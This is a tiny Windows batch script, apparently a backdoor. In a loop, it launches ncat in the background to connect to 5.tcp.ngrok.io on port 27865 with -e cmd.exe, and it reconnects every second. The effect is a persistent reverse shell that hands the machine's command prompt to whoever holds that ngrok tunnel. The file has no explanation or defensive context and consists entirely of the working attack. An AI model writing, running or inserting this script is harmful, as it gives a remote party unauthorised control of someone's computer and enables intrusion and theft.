@echo off
:connect
start /B cmd /c ncat 5.tcp.ngrok.io 27865 -e cmd.exe
timeout /t 1 /nobreak > nul
goto connect